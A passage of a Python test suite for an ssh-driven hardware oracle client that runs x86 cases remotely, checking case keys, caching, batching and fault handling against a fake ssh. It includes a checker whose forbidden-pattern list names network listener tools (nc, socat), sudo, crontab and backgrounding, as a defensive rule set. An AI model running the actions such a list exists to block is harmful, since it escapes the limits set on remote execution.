        add("stop added", lambda s: s["stops"].append(client.CODE_ADDR + 30))
        add("stop changed", lambda s: s["stops"].__setitem__(1, client.CODE_ADDR + 21))
        add("stop removed", lambda s: s["stops"].pop())
        add("poke added", lambda s: s["pokes"].append((client.DATA_ADDR + 200, b"z")))
        add("poke removed", lambda s: s["pokes"].pop())
        add("poke address", lambda s: s["pokes"].__setitem__(0, (client.DATA_ADDR + 9, b"abcdef")))
        add("poke byte", lambda s: s["pokes"].__setitem__(0, (client.DATA_ADDR + 8, b"abcdeg")))
        add("poke longer by a zero", lambda s: s["pokes"].__setitem__(1, (client.DATA_ADDR + 100, b"\x01\x00")))
        add("poke empty", lambda s: s["pokes"].__setitem__(1, (client.DATA_ADDR + 100, b"")))
        add("code_len", lambda s: s.update(code_len=18))
        add("unchecked", lambda s: s.update(unchecked=True))

        def region(i, **kw):
            def fn(s):
                a, d, p, z = s["regions"][i]
                s["regions"][i] = (kw.get("addr", a), kw.get("data", d), kw.get("prot", p), kw.get("size", z))
            return fn
        add("region 0 address", region(0, addr=client.CODE_ADDR + 0x1000))
        add("region 1 address", region(1, addr=client.DATA_ADDR + 0x1000))
        add("region 1 size", region(1, size=0x3000))
        add("region 2 size", region(2, size=0x4000))
        add("region 0 size", region(0, size=0x2000))
        add("region 0 prot", region(0, prot=R | W | X))
        add("region 1 prot", region(1, prot=R))
        add("region 0 first byte", region(0, data=flip(bytes(range(200)), 0)))
        add("region 0 middle byte", region(0, data=flip(bytes(range(200)), 100)))
        add("region 0 last byte", region(0, data=flip(bytes(range(200)), 199)))
        add("region 0 one byte longer", region(0, data=bytes(range(200)) + b"\0"))
        add("region 1 now has data", region(1, data=bytes(8)))
        add("region 2 last byte", region(2, data=flip(bytes(range(50, 60)), 9)))
        add("region added", lambda s: s["regions"].append((0x400000000000, b"", R, None)))
        add("region removed", lambda s: s["regions"].pop())
        add("regions swapped", lambda s: s["regions"].insert(0, s["regions"].pop(1)))
        return out

    def test_equal_cases_have_equal_keys(self):
        a, b = build_case(base_spec(), tag="x"), build_case(base_spec(), tag={"y": 1})
        self.assertIsNot(a.regions, b.regions)
        self.assertEqual(len(a.key()), 32)
        self.assertEqual(a.key(), b.key())
        self.assertEqual(a.key(), a.key())
        self.assertEqual(client.Case(list(a.regions), a.rip, gpr=a.gpr, rflags=a.rflags, xmm=a.xmm, mxcsr=a.mxcsr,
                                     gs_base=a.gs_base, max_insns=a.max_insns, stops=a.stops, pokes=a.pokes,
                                     code_len=a.code_len).key(), a.key(), "regions as a list instead of a tuple")

    def test_any_single_change_changes_the_key(self):
        base = build_case(base_spec()).key()
        keys = {name: build_case(s).key() for name, s in self.variants().items()}
        self.assertGreaterEqual(len(keys), 50)
        for name, k in keys.items():
            self.assertNotEqual(k, base, name)
        by_key = {}
        for name, k in keys.items():
            by_key.setdefault(k, []).append(name)
        self.assertEqual([v for v in by_key.values() if len(v) > 1], [], "two different changes give the same key")

    def test_tag_is_not_part_of_the_key(self):
        keys = {build_case(base_spec(), tag=t).key() for t in (None, 0, "a", ("b", 2), object())}
        self.assertEqual(len(keys), 1)

    def test_format_version_and_answers_revision_are_part_of_the_key(self):
        base = build_case(base_spec()).key()
        with mock.patch.object(client, "ANSWERS_REV", client.ANSWERS_REV + 1):
            self.assertNotEqual(build_case(base_spec()).key(), base)
        with mock.patch.object(client, "FORMAT_VERSION", client.FORMAT_VERSION + 1):
            self.assertNotEqual(build_case(base_spec()).key(), base)
        self.assertEqual(build_case(base_spec()).key(), base)


# =============================================== the remote-rules checker (used by E.15)

FORBIDDEN = [
    (r"\bsudo\b", "sudo"), (r"/mnt", "/mnt"), (r"\bcrontab\b", "crontab"), (r"\bnohup\b", "nohup"),
    (r"\bsystemctl\b", "systemctl"), (r"(?<![&>])&(?![&>])", "'&' (a job in the background)"),
    (r"(?<![\w./-])(?:nc|ncat|netcat|socat)(?=\s)", "nc (a network listener)"), (r"(?i)listen", "listen"),
    (r"\b(?:setsid|disown|tmux|screen|pkill|killall)\b", "a way to leave something running or kill others"),
    (r"`", "a backquote substitution (not analysed)"),
]
SKIP_WORDS = {"{", "}", "do", "then", "else", "elif", "if", "fi", "while", "until", "!"}
MUTATING = {"rm", "mv", "mkdir", "rmdir", "cp", "ln", "touch", "chmod", "chown", "tee", "dd", "truncate", "install",
            "kill"}
NO_PATH_CHECK = {"echo", "printf", "exit", "for", "case", "esac", "done", "[", "continue", "true", "set", "umask",
                 "id", "test"}
ALLOWED = {"set", "umask", "mkdir", "cd", "cat", "mv", "ls", "tail", "rm", "test", "exit", "sha256sum", "cut", "du",
           "find", "sort", "echo", "readlink", "stat", "for", "case", "esac", "done", "[", "continue", "id", "true"}


def _matching_paren(s, i):
    depth = 0
    for j in range(i, len(s)):
        if s[j] == "(":
            depth += 1
        elif s[j] == ")":
            depth -= 1
            if depth == 0:
                return j
    raise ValueError("unbalanced '$(' in %r" % s[:60])


def shell_commands(script):
    """Simple commands of a shell script: [{"words", "redirs": [(op, target)], "subs": [script]}].  Quote
    aware; $( ... ) bodies are returned as separate scripts in "subs"."""
    cmds = []
    st = {"words": [], "redirs": [], "subs": [], "word": None, "pending": None}

    def end_word():
        w = st["word"]
        if w is None:
            return
        text = "".join(w)
        st["word"] = None
        if st["pending"] is not None:
            st["redirs"].append((st["pending"], text))
            st["pending"] = None
        else:
            st["words"].append(text)

    def end_cmd():
        end_word()
        if st["words"] or st["redirs"] or st["subs"]:
            cmds.append({"words": st["words"], "redirs": st["redirs"], "subs": st["subs"]})
        st["words"], st["redirs"], st["subs"] = [], [], []

    def add(text):
        if st["word"] is None:
            st["word"] = []
        st["word"].append(text)

    i, n = 0, len(script)
    while i < n:
        ch = script[i]
        if ch == "\\":
            add(script[i + 1:i + 2])
            i += 2
        elif ch == "'":
            j = script.index("'", i + 1)
            add(script[i + 1:j])
            i = j + 1
        elif ch == '"':
            j, buf = i + 1, []
            while script[j] != '"':
                if script[j] == "\\":
                    buf.append(script[j + 1])
                    j += 2
                elif script.startswith("$(", j):
                    k = _matching_paren(script, j + 1)
                    st["subs"].append(script[j + 2:k])
                    buf.append(script[j:k + 1])
                    j = k + 1
                else:
                    buf.append(script[j])
                    j += 1
            add("".join(buf))
            i = j + 1
        elif script.startswith("$(", i):
            k = _matching_paren(script, i + 1)
            st["subs"].append(script[i + 2:k])
            add(script[i:k + 1])
            i = k + 1
        elif ch in " \t":
            end_word()
            i += 1
        elif ch in "<>":
            fd = ""
            if st["word"] is not None and "".join(st["word"]).isdigit():
                fd, st["word"] = "".join(st["word"]), None
            else:
                end_word()
            op = script[i:i + 2] if script[i:i + 2] in (">>", ">&", "<<") else ch
            st["pending"] = fd + op
            i += len(op)
        elif ch in ";&|()\n":
            end_cmd()
            i += 2 if script[i:i + 2] in ("&&", "||", ";;") else 1
        else:
            add(ch)
            i += 1
    end_cmd()
    return cmds


def _path_problem(p, mutating, cwd_ok):
    q = p.replace("$$", "")                       # the shell's pid, used in temporary names
    if q.startswith("$") and not mutating:
        return None                               # e.g. $p/exe under /proc in the process listing
    if "$" in q or "~" in q:
        return "path built from a variable or '~': %r" % p
    if q.startswith("/"):
        if q.startswith("/proc/") and not mutating:
            return None
        return "absolute path %r" % p
    if ".." in q.split("/"):
        return "path with '..': %r" % p
    if q == D or q.startswith(D + "/") or cwd_ok:
        return None
    return "relative path %r used before 'cd %s'" % (p, D)


def _analyse(script, cwd_ok, problems, stats):
    for c in shell_commands(script):
        for sub in c["subs"]:
            cwd_ok = _analyse(sub, cwd_ok, problems, stats)
        for op, target in c["redirs"]:
            if target == "/dev/null" or op.endswith("&"):
                continue
            pr = _path_problem(target, ">" in op, cwd_ok)
            if pr:
                problems.append("redirect %s %s: %s" % (op, target, pr))
        words = list(c["words"])
        while words and (words[0] in SKIP_WORDS or re.match(r"[A-Za-z_]\w*=", words[0])):
            words.pop(0)
        wrappers = []
        while words:
            w = words[0]
            if w in ("exec", "command"):
                words.pop(0)
            elif w == "nice":
                words.pop(0)
                wrappers.append("nice")
                if words[:1] == ["-n"]:
                    words = words[2:]
            elif w == "timeout":
                words.pop(0)
                while words[:1] in (["-k"], ["-s"]):
                    words = words[2:]
                if words and re.fullmatch(r"[1-9]\d*[smhd]?", words[0]):
                    words.pop(0)
                    wrappers.append("timeout")
                else:
                    problems.append("timeout without a positive duration")
            elif w == "xargs":
                words.pop(0)
                wrappers.append("xargs")
                while words and words[0].startswith("-"):
                    words.pop(0)
            else:
                break
        if not words:
            continue
        cmd, args = words[0], words[1:]
        mutating = False
        if re.fullmatch(r"bin/runner-[0-9a-f]{16}", cmd) or cmd in ("gcc", "cc"):
            stats["gcc" if cmd in ("gcc", "cc") else "runner"] += 1
            if wrappers[-2:] != ["nice", "timeout"]:
                problems.append("%s is not run under 'nice' and 'timeout' (wrappers: %s)" % (cmd, wrappers))
            paths = [cmd] + ([args[k + 1] for k, a in enumerate(args[:-1]) if a == "-o"] +
                             [a for a in args if a.endswith(".c")] if cmd in ("gcc", "cc") else [])
            mutating = cmd in ("gcc", "cc")
        elif cmd not in ALLOWED and cmd not in MUTATING:
            problems.append("command %r is not one the client is expected to use" % cmd)
            paths = []
        elif cmd == "cd":
            t = args[0] if args else ""
            if (t == D or t.startswith(D + "/")) and ".." not in t.split("/"):
                cwd_ok = True
            else:
                problems.append("cd %r leaves %s" % (t, D))
            continue
        elif cmd in MUTATING:
            paths, mutating = [a for a in args if not a.startswith("-")], True
        elif cmd in NO_PATH_CHECK:
            paths = []
        else:
            paths = [a for a in args if not a.startswith(("-", "+")) and not re.search(r"\s", a)
                     and ("/" in a or a == "." or a.startswith("~"))]
        for p in paths:
            pr = _path_problem(p, mutating, cwd_ok)
            if pr:
                problems.append("%s: %s" % (cmd, pr))
    return cwd_ok


def check_remote_script(script):
    """(problems, stats) for one remote shell script, by reading it as text."""
    problems, stats = [], {"runner": 0, "gcc": 0}
    for rx, what in FORBIDDEN:
        if re.search(rx, script):
            problems.append("contains " + what)
    try:
        _analyse(script, False, problems, stats)
    except ValueError as e:
        problems.append("could not be analysed: %s" % e)
    return problems, stats


# ===================================================================== E. Oracle with the fake

class FakeSshMixin:
    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="hwo-client-test-")
        self.addCleanup(shutil.rmtree, self.tmp, True)
        self.state = os.path.join(self.tmp, "state")
        os.mkdir(self.state)
        self.cache_root = tempfile.mkdtemp(prefix="cache-", dir=self.tmp)
        self.ssh = os.path.join(self.tmp, "ssh")
        with open(self.ssh, "w") as f:
            f.write("#!/bin/sh\nexec %s %s \"$@\"\n" % (shlex.quote(sys.executable), shlex.quote(FAKE_SSH)))
        os.chmod(self.ssh, 0o755)
        self.enterContext(mock.patch.dict(os.environ, {"FAKE_SSH_STATE": self.state}))
        self.enterContext(mock.patch.object(client, "SSH", self.ssh))

    # -- the fake's state --

    def knobs(self, **kv):
        path = os.path.join(self.state, "knobs.json")
        try:
            with open(path) as f:
                cur = json.load(f)
        except FileNotFoundError:
            cur = {}
        for k, v in kv.items():
            if v is None:
                cur.pop(k, None)
            else:
                cur[k] = v
        with open(path, "w") as f:
            json.dump(cur, f)

    def set_knobs(self, **kv):
        """Replace all knobs by exactly these."""
        with open(os.path.join(self.state, "knobs.json"), "w") as f:
            json.dump(kv, f)

    def log(self):
        try:
            with open(os.path.join(self.state, "calls.jsonl")) as f:
                return [json.loads(line) for line in f if line.strip()]
        except FileNotFoundError:
            return []

    def kinds(self, log=None):
        out = []
        for e in (self.log() if log is None else log):
            k = e["kind"]
            if k == "runner" and e["exit"] == 97:
                k = "runner97"
            elif k == "runner" and e.get("status") == 2:
                k = "runner_missing_blobs"
            elif k == "runner" and e["exit"] == 255:
                k = "runner_unreachable"
            out.append(k)
        return out

    def batches(self, log=None):
        return [e for e in (self.log() if log is None else log)
                if e["kind"] == "runner" and e.get("ran") and "--selftest" not in e["args"] and e.get("status") == 0]

    # -- the oracle --

    def oracle(self, **kw):
        kw.setdefault("family", "tests")
        kw.setdefault("cache_root", self.cache_root)
        return client.Oracle(host="fake@fake-host", **kw)

    def offline(self, cases, family="tests"):
        ora = self.oracle(family=family, offline=True)
        res = ora.run(cases)
        self.assertEqual(ora.ssh_calls, 0)
        return res

    def is_cached(self, cases, family="tests"):
        return [r.outcome != client.NO_ANSWER for r in self.offline(cases, family)]

    def assert_cache_clean(self, family="tests"):
        d = os.path.join(self.cache_root, family)
        names = os.listdir(d) if os.path.isdir(d) else []
        self.assertEqual([n for n in names if not (n.startswith("seg-") and n.endswith(".hwc"))], [])
        c = cachemod.Cache(self.cache_root, family)
        self.assertEqual(c.damaged, [])
        self.assertEqual(c.conflicts, [])

    def assert_nothing_cached(self, cases, family="tests"):
        self.assertEqual(self.is_cached(cases, family), [False] * len(cases))
        d = os.path.join(self.cache_root, family)
        self.assertEqual(os.listdir(d) if os.path.isdir(d) else [], [])

    def check_answer(self, case, res, salt=b""):
        rax, xmm3, rflags, mem = expected_answer(case, salt)
        self.assertEqual((res.outcome, res.detail, res.insns), (client.DONE, 0, 1))
        self.assertEqual(res.rip, (case.rip + 1) & M64)
        self.assertEqual(res.gpr[0], rax)
        self.assertEqual(res.gpr[1:], [x & M64 for x in case.gpr[1:]])
        self.assertEqual(res.xmm[:48], case.xmm[:48])
        self.assertEqual(res.xmm[48:64], xmm3)
        self.assertEqual(res.xmm[64:], case.xmm[64:])
        self.assertEqual(res.rflags, rflags)
        self.assertEqual(res.mem, mem)


class OracleWithFakeSsh(FakeSshMixin, unittest.TestCase):
    # ---- E.1 ----

    def test_first_run_then_answers_come_from_the_cache(self):
        cases = cases_for(data_set(), 5)
        ora = self.oracle()
        res = ora.run(cases)
        self.assertEqual(len(res), 5)
        for c, r in zip(cases, res):
            self.check_answer(c, r)
            self.assertFalse(r.cached)
            self.assertEqual(r.cpu, "Fake CPU")
            self.assertEqual(r.raw[4:8], bytes(4))
        self.assertEqual(self.kinds(), ["runner97", "build", "runner"])
        b = self.batches()
        self.assertEqual(len(b), 1)
        self.assertEqual(b[0]["n_cases"], 5)
        self.assertEqual(b[0]["case_keys"], [c.key().hex() for c in cases])       # the caller's order
        self.assertEqual((ora.sent, ora.from_cache), (5, 0))
        self.assertEqual(ora.header["runner_build"], client.RUNNER_HASH)

        again = self.oracle()
        res2 = again.run(cases)
        self.assertEqual(again.ssh_calls, 0)
        self.assertEqual(len(self.log()), 3, "the second Oracle must not have asked the fake anything")
        for c, r1, r2 in zip(cases, res, res2):
            self.assertEqual(r1.raw, r2.raw)
            self.assertTrue(r2.cached)
            self.assertEqual(r2.cpu, "Fake CPU")
            same_result(self, r1, r2)
            self.check_answer(c, r2)
        self.assertEqual((again.sent, again.from_cache), (0, 5))
        self.assert_cache_clean()

    def test_results_are_attached_to_the_right_case(self):
        # cases that differ only in registers; the answer is a function of the whole case
        rng = random.Random(3)
        cases = [client.Case(data_set(), client.CODE_ADDR, gpr=[rng.getrandbits(64) for _ in range(16)],
                             xmm=rng.randbytes(256), rflags=rng.getrandbits(12)) for _ in range(12)]
        for r, c in zip(self.oracle().run(cases), cases):
            self.check_answer(c, r)

    # ---- E.2 ----

    def test_offline_with_an_empty_cache(self):
        cases = cases_for(data_set(), 4)
        ora = self.oracle(offline=True)
        res = ora.run(cases)
        self.assertEqual(ora.ssh_calls, 0)
        self.assertEqual(self.log(), [])
        for c, r in zip(cases, res):
            self.assertEqual(r.outcome, client.NO_ANSWER)
            self.assertEqual(r.gpr, [x & M64 for x in c.gpr])
            self.assertEqual((r.rip, r.insns, r.raw, r.cached, r.mem), (c.rip, 0, b"", False, []))
            self.assertIn("no hardware answer", r.describe())
        res = self.oracle().run(cases, offline=True)               # per call, on an online Oracle
        self.assertTrue(all(r.outcome == client.NO_ANSWER for r in res))
        self.assertEqual(self.log(), [])

    def test_offline_with_a_partly_filled_cache(self):
        cases = cases_for(data_set(), 6)
        self.oracle().run(cases[1:3])
        n_log = len(self.log())
        ora = self.oracle(offline=True)
        res = ora.run(cases)
        self.assertEqual(ora.ssh_calls, 0)
        self.assertEqual(len(self.log()), n_log)
        self.assertEqual([r.outcome == client.NO_ANSWER for r in res], [True, False, False, True, True, True])
        for i in (1, 2):
            self.check_answer(cases[i], res[i])
            self.assertTrue(res[i].cached)
            self.assertEqual(res[i].cpu, "Fake CPU")

    def test_refresh_offline_still_reads_the_cache_and_never_asks(self):
        cases = cases_for(data_set(), 4)
        self.oracle().run(cases[:2])
        n_log = len(self.log())
        ora = self.oracle()
        res = ora.run(cases, offline=True, refresh=True)
        self.assertEqual(ora.ssh_calls, 0)
        self.assertEqual(len(self.log()), n_log)
        self.assertEqual([r.outcome == client.NO_ANSWER for r in res], [False, False, True, True])
        self.assertTrue(res[0].cached and res[1].cached)

    def test_use_cache_false_stores_nothing_and_asks_every_time(self):
        cases = cases_for(data_set(), 2)
        ora = self.oracle(use_cache=False)
        ora.run(cases)
        ora.run(cases)
        self.assertEqual(len(self.batches()), 2)
        self.assertEqual(os.listdir(self.cache_root), [])

    # ---- E.3 / E.4 ----

    def test_mixed_hits_and_misses_send_only_the_misses(self):
        cases = cases_for(data_set(), 6)
        self.oracle().run([cases[0], cases[2], cases[4]])
        n_before = len(self.batches())
        ora = self.oracle()
        res = ora.run(cases)
        new = self.batches()[n_before:]
        self.assertEqual(len(new), 1)
        self.assertEqual(new[0]["case_keys"], [cases[i].key().hex() for i in (1, 3, 5)])
        self.assertEqual([r.cached for r in res], [True, False, True, False, True, False])
        for c, r in zip(cases, res):
            self.check_answer(c, r)
        self.assertEqual((ora.sent, ora.from_cache), (3, 3))

    def test_the_same_case_twice_is_sent_once(self):
        regions = data_set()
        a, b, c = cases_for(regions, 3)
        a2 = client.Case(regions, a.rip, gpr=list(a.gpr), tag="another tag")
        res = self.oracle().run([a, b, a2, c, a])
        batches = self.batches()
        self.assertEqual(len(batches), 1)
        self.assertEqual(batches[0]["case_keys"], [a.key().hex(), b.key().hex(), c.key().hex()])
        for i, case in enumerate([a, b, a, c, a]):
            self.check_answer(case, res[i])
        self.assertEqual(res[0].raw, res[2].raw)
        self.assertEqual(res[0].raw, res[4].raw)
        self.assertEqual(res[2].cpu, "Fake CPU")
        self.assertEqual(self.is_cached([a, b, c]), [True] * 3)
        self.assertEqual(len(cachemod.Cache(self.cache_root, "tests")), 3)

    # ---- E.5 ----

    def test_runner_is_built_when_missing_and_only_then(self):
        ora = self.oracle()
        ora.run(cases_for(data_set(), 2))
        log = self.log()
        self.assertEqual(self.kinds(log), ["runner97", "build", "runner"])
        build = log[1]
        self.assertIn("gcc " + client.GCC_FLAGS, build["script"])
        self.assertIn("runner-" + client.RUNNER_HASH, build["script"])
        self.assertEqual(build["stdin_len"], len(client._SRC.encode()))
        self.assertEqual(build["exit"], 0)
        for e in (log[0], log[2]):
            self.assertIn("bin/runner-" + client.RUNNER_HASH, e["script"])
        self.assertEqual(log[0]["stdin_len"], log[2]["stdin_len"])
        ora.run(cases_for(data_set(), 2, start=10))
        self.assertEqual(self.kinds(), ["runner97", "build", "runner", "runner"])
        self.oracle().run(cases_for(data_set(), 2, start=20))                 # a new Oracle: the runner is still there
        self.assertEqual(self.kinds(), ["runner97", "build", "runner", "runner", "runner"])

    def test_a_build_that_fails_or_is_still_missing_raises_oracle_error(self):
        self.knobs(build_fails=True)
        cases = cases_for(data_set(), 2)
        with self.assertRaises(client.OracleError):
            self.oracle().run(cases)
        self.assert_nothing_cached(cases)

    def test_a_compiler_warning_fails_the_build_and_installs_nothing(self):
        # The runner is built with -Werror: a warning is a failed build, every time, until the source is fixed.
        self.assertIn("-Werror", client.GCC_FLAGS)
        self.knobs(build_warns=True)
        cases = cases_for(data_set(), 2)
        for _ in range(2):
            with self.assertRaises(client.OracleError):
                self.oracle().run(cases)
        self.assert_nothing_cached(cases)
        self.assertEqual(self.kinds().count("build"), 2)
        self.assertEqual(self.kinds().count("runner"), 0)
        self.knobs(build_warns=None)
        res = self.oracle().run(cases)
        self.check_answer(cases[0], res[0])

    # ---- E.6 ----

    def big_regions(self, n=300000, seed=6, addr=0x300000000000):
        blob = client.Blob(random.Random(seed).randbytes(n))
        return blob, (client.code_region(b"\x90"), client.Region(addr, blob, R))

    def test_a_big_region_is_uploaded_once(self):
        ora = self.oracle()
        ora.build()
        blob, regions = self.big_regions()
        res = ora.run(cases_for(regions, 3))
        self.assertEqual(self.kinds(), ["build", "blob_list", "blob_upload", "runner"])
        log = self.log()
        up, run = log[2], log[3]
        self.assertEqual(up["stdin_len"], 300000)
        self.assertIn(blob.sha.hex(), up["script"])
        with open(os.path.join(self.state, "blobs", blob.sha.hex()), "rb") as f:
            self.assertEqual(f.read(), blob.data)
        self.assertEqual(run["stored"], [blob.sha.hex()])
        self.assertLess(run["stdin_len"], 5000, "the batch must not carry the image")
        for c, r in zip(cases_for(regions, 3), res):
            self.check_answer(c, r)
        ora.run(cases_for(regions, 3, start=10))                       # later batch, same Oracle
        self.assertEqual(self.kinds()[4:], ["runner"])
        self.oracle().run(cases_for(regions, 2, start=30))             # a new Oracle lists, finds it, does not upload
        self.assertEqual(self.kinds()[5:], ["blob_list", "runner"])

    def test_two_region_sets_sharing_a_big_image_upload_it_once(self):
        ora = self.oracle()
        ora.build()
        blob, regions = self.big_regions(seed=8)
        other = (client.Region(0x340000000000, blob, R | W), client.Region(client.DATA_ADDR, None, R | W))
        ora.run(cases_for(regions, 2) + cases_for(other, 2, start=5))
        self.assertEqual(self.kinds(), ["build", "blob_list", "blob_upload", "runner"])
        self.assertEqual(len(self.batches()), 1)

    def test_an_image_of_exactly_the_inline_limit_is_sent_inline(self):
        ora = self.oracle()
        ora.build()
        blob, regions = self.big_regions(n=client.INLINE_BLOB_MAX, seed=9)
        ora.run(cases_for(regions, 2))
        self.assertEqual(self.kinds(), ["build", "runner"])
        self.assertGreater(self.log()[1]["stdin_len"], client.INLINE_BLOB_MAX)
        self.assertEqual(self.log()[1]["stored"], [])

    # ---- E.7 ----

    def test_a_lost_image_is_uploaded_again_and_the_batch_retried(self):
        ora = self.oracle()
        ora.build()
        blob, regions = self.big_regions(seed=7)
        cases = cases_for(regions, 3)
        self.knobs(lose_blob=1)
        res = ora.run(cases)
        self.assertEqual(self.kinds(), ["build", "blob_list", "blob_upload", "runner_missing_blobs", "blob_upload",
                                        "runner"])
        for c, r in zip(cases, res):
            self.check_answer(c, r)
        self.assertEqual(self.is_cached(cases), [True] * 3)
        # the same, discovered in a later batch of an Oracle that believes the image is there
        more = cases_for(regions, 3, start=20)
        self.knobs(lose_blob=1)
        res = ora.run(more)
        self.assertEqual(self.kinds()[6:], ["runner_missing_blobs", "blob_upload", "runner"])
        for c, r in zip(more, res):
            self.check_answer(c, r)

    def test_an_image_that_keeps_disappearing_is_an_error_and_stores_nothing(self):
        ora = self.oracle()
        ora.build()
        blob, regions = self.big_regions(seed=7)
        cases = cases_for(regions, 2)
        self.knobs(lose_blob=99)
        with self.assertRaises(client.OracleError):
            ora.run(cases)
        self.assertEqual(self.kinds().count("runner_missing_blobs"), 2)
        self.assert_nothing_cached(cases)

    # ---- E.8 ----

    def test_unreachable(self):
        cases = cases_for(data_set(), 3)
        self.knobs(unreachable=True)
        with self.assertRaises(client.OracleUnavailable) as cm:
            self.oracle().run(cases)
        self.assertIn("ssh", str(cm.exception))
        self.assertEqual(len(self.log()), 1)
        self.assertEqual(self.log()[0]["exit"], 255)
        self.assert_nothing_cached(cases)
        # cached cases are still answered offline, and a partly cached call fails as a whole
        self.knobs(unreachable=None)
        self.oracle().run(cases[:1])
        self.knobs(unreachable=True)
        with self.assertRaises(client.OracleUnavailable):
            self.oracle().run(cases)
        self.assertEqual(self.is_cached(cases), [True, False, False])

    # ---- E.9 ----

    def multi(self, n=6):
        """n cases that cost 0.05 s each in the client's estimate: with batch_seconds=0.12, two per batch."""
        return cases_for(data_set(), n, max_insns=2)

    def test_baseline_batches_of_two(self):
        cases = self.multi()
        res = self.oracle(batch_seconds=0.12).run(cases)
        self.assertEqual([b["n_cases"] for b in self.batches()], [2, 2, 2])
        self.assertEqual(self.is_cached(cases), [True] * 6)
        for c, r in zip(cases, res):
            self.check_answer(c, r)

    def test_failure_between_batches_keeps_the_batches_before_it_and_nothing_of_the_failed_one(self):
        cases = self.multi()
        self.knobs(fail_after_calls=2)
        with self.assertRaises(client.OracleUnavailable):
            self.oracle(batch_seconds=0.12).run(cases)
        done = self.batches()
        self.assertEqual([b["n_cases"] for b in done], [2, 2])
        sent = {k for b in done for k in b["case_keys"]}
        self.assertEqual(len(sent), 4)
        cached = self.is_cached(cases)
        self.assertEqual(cached, [c.key().hex() in sent for c in cases])
        self.assertEqual(sum(cached), 4)
        self.assertEqual(self.kinds()[-1], "runner_unreachable")
        self.assert_cache_clean()
        # when the machine is back, only what is missing is asked
        self.knobs(fail_after_calls=None)
        n = len(self.batches())
        res = self.oracle(batch_seconds=0.12).run(cases)
        again = self.batches()[n:]
        self.assertEqual([b["n_cases"] for b in again], [2])
        self.assertEqual({k for b in again for k in b["case_keys"]}, {c.key().hex() for c in cases} - sent)
        for c, r in zip(cases, res):
            self.check_answer(c, r)

    def test_a_cut_stream_is_unavailable_and_stores_nothing_of_that_batch(self):
        # how long is a whole stream?
        cases = cases_for(data_set(), 3)
        with mock.patch.object(client, "parse_results", wraps=client.parse_results) as spy:
            self.oracle(use_cache=False).run(cases)
        total = len(spy.call_args_list[0].args[0])
        self.assertGreater(total, client.RESULT_HDR.size + 8)
        points = sorted({0, 1, 100, client.RESULT_HDR.size - 1, client.RESULT_HDR.size, client.RESULT_HDR.size + 1,
                         client.RESULT_HDR.size + 40, total // 2, total - 9, total - 8, total - 1})
        for k, cut in enumerate(points):
            with self.subTest(cut=cut):
                family = "cut%d" % k
                self.knobs(truncate_after=cut)
                with self.assertRaises(client.OracleUnavailable):
                    self.oracle(family=family).run(cases)
                self.assert_nothing_cached(cases, family)
        self.knobs(truncate_after=total)                               # a "cut" at the full length is no cut
        self.check_answer(cases[0], self.oracle(family="whole").run(cases)[0])

    def test_a_stream_without_its_end_marker_is_unavailable(self):
        cases = cases_for(data_set(), 3)
        self.knobs(drop_end_marker=True)
        with self.assertRaises(client.OracleUnavailable) as cm:
            self.oracle().run(cases)
        self.assertIn("end marker", str(cm.exception))
        self.assert_nothing_cached(cases)

    def test_a_cut_second_batch_keeps_the_first(self):
        cases = self.multi()
        for knob in ({"truncate_after": 500}, {"drop_end_marker": True}):
            with self.subTest(knob=knob):
                family = "second-" + next(iter(knob))
                ran = sum(1 for e in self.log() if e["kind"] == "runner" and e.get("ran"))
                self.set_knobs(fault_from_call=ran + 1, **knob)        # the first batch of this call is fine
                n = len(self.batches())
                with self.assertRaises(client.OracleUnavailable):
                    self.oracle(family=family, batch_seconds=0.12).run(cases)
                first = self.batches()[n]
                self.assertEqual(sum(self.is_cached(cases, family)), 2)
                self.assertEqual(self.is_cached(cases, family),
                                 [c.key().hex() in first["case_keys"] for c in cases])
                self.assert_cache_clean(family)
                self.set_knobs()

    def test_garbage_and_mismatched_headers_are_oracle_errors(self):
        cases = cases_for(data_set(), 2)
        for k, knob in enumerate(({"garbage_header": True}, {"wrong_build": "0123456789abcdef"},
                                  {"wrong_answers_rev": client.ANSWERS_REV + 1})):
            with self.subTest(knob=knob):
                self.set_knobs(**knob)
                family = "hdr%d" % k
                with self.assertRaises(client.OracleError):
                    self.oracle(family=family).run(cases)
                self.assert_nothing_cached(cases, family)

    def test_a_failing_self_test_refuses_the_batch(self):
        cases = cases_for(data_set(), 2)
        self.knobs(selftest_fails=True)
        with self.assertRaises(client.OracleError) as cm:
            self.oracle().run(cases)
        self.assertIn("refused the batch", str(cm.exception))
        self.assert_nothing_cached(cases)

    # ---- E.10 ----

    def test_cacheable_rule(self):
        for outcome in (client.DONE, client.FAULT):
            for detail in (0, 1, 2, 0x100, 34):
                self.assertTrue(client.cacheable(outcome, detail), (outcome, detail))
        for detail in list(range(16, 34)) + [35, 0]:
            self.assertTrue(client.cacheable(client.REFUSED, detail), detail)
        self.assertFalse(client.cacheable(client.REFUSED, 34))
        for outcome in (client.TIMEOUT, client.KILLED, client.BAD_CASE, client.RUNNER_ERROR, client.NO_ANSWER):
            for detail in (0, 1, 7, 9, 34, 2000, 0x101):
                self.assertFalse(client.cacheable(outcome, detail), (outcome, detail))

    def test_only_answers_that_are_facts_about_the_case_are_stored(self):
        regions = data_set()
        cases = cases_for(regions, 10)
        cases[3] = client.Case(regions, client.CODE_ADDR, gpr=client.gpr_list(rax=3, rcx=0x77), unchecked=True)
        self.knobs(timeout_cases=[4], killed_cases=[5],
                   outcome_cases={"1": [client.FAULT, 0], "2": [client.REFUSED, 17], "6": [client.BAD_CASE, 7],
                                  "7": [client.BAD_CASE, 1], "8": [client.RUNNER_ERROR, 0x101],
                                  "9": [client.REFUSED, 33]})
        res = self.oracle().run(cases)
        got = [(r.outcome, r.detail) for r in res]
        self.assertEqual(got, [(client.DONE, 0), (client.FAULT, 0), (client.REFUSED, 17),
                               (client.REFUSED, 34),                         # unchecked, no --allow-unchecked
                               (client.TIMEOUT, 2000), (client.KILLED, 9), (client.BAD_CASE, 7), (client.BAD_CASE, 1),
                               (client.RUNNER_ERROR, 0x101), (client.REFUSED, 33)])
        self.check_answer(cases[0], res[0])
        for r, c in zip(res, cases):
            self.assertFalse(r.cached)
            if r.outcome in (client.TIMEOUT, client.KILLED):
                self.assertEqual(r.rip, c.rip)
                self.assertFalse(r.has_state)
        stored = {0, 1, 2, 9}
        self.assertEqual(self.is_cached(cases), [i in stored for i in range(10)])
        self.assert_cache_clean()
        off = self.offline(cases)
        for i in stored:
            self.assertEqual((off[i].outcome, off[i].detail), got[i])
            self.assertTrue(off[i].cached)
        for i in set(range(10)) - stored:
